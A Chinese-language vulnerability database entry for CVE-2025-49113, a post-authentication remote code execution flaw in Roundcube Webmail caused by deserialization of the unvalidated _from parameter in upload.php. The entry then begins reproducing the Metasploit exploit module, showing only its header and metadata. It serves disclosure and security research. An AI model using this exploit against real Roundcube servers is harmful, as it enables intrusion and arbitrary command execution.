漏洞信息漏洞名称： Roundcube Post-Auth RCE via PHP Object Deserialization 漏洞编号： CVE： CVE-2025-49113 漏洞类型： 反序列化 漏洞等级： 高危 漏洞描述： Roundcube Webmail在1.5.10之前和1.6.x在1.6.11之前的版本中，由于program&#x2F;actions&#x2F;settings&#x2F;upload.php中的_from参数未经验证，导致PHP对象反序列化漏洞。攻击者可以以Web服务器权限执行任意系统命令。 产品厂商： Roundcube 产品名称： Roundcube Webmail 影响版本： 1.6.x &lt; 1.6.11, &lt; 1.5.10 来源： https://github.com/rapid7/metasploit-framework/blob/f2920f868aa458cdaf74f20632ffa91faf68dfdc/modules%2Fexploits%2Fmulti%2Fhttp%2Froundcube_auth_rce_cve_2025_49113.rb 类型： rapid7&#x2F;metasploit-framework:github commit POC详情### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule &lt; Msf::Exploit::Remote Rank = ExcellentRanking include Msf::Exploit::Remote::HttpClient include Msf::Exploit::FileDropper include Msf::Exploit::CmdStager prepend Msf::Exploit::Remote::AutoCheck def initialize(info = &#123;&#125;) super( update_info( info, &#x27;Name&#x27; =&gt; &#x27;Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization&#x27;, &#x27;Description&#x27; =&gt; %q&#123; Roundcube Webmail before 1.5.10 and 1.6.x before 1.6.11 allows remote code execution by authenticated users because the _from parameter in a URL is not validated in program/actions/settings/upload.php, leading to PHP Object Deserialization. An attacker can execute arbitrary system commands as the web server. &#125;, &#x27;Author&#x27; =&gt; [ &#x27;Maksim Rogov&#x27;, # msf module &#x27;Kirill Firsov&#x27;, # disclosure and original exploit ], &#x27;License&#x27; =&gt; MSF_LICENSE, &#x27;References&#x27; =&gt; [ [&#x27;CVE&#x27;, &#x27;2025-49113&#x27;], [&#x27;URL&#x27;, &#x27;https://fearsoff.org/research/roundcube&#x27;] ], &#x27;DisclosureDate&#x27; =&gt; &#x27;2025-06-02&#x27;, &#x27;Notes&#x27; =&gt; &#123; &#x27;Stability&#x27; =&gt; [CRASH_SAFE], &#x27;SideEffects&#x27; =&gt; [IOC_IN_LOGS], &#x27;Reliability&#x27; =&gt; [REPEATABLE_SESSION] &#125;, &#x27;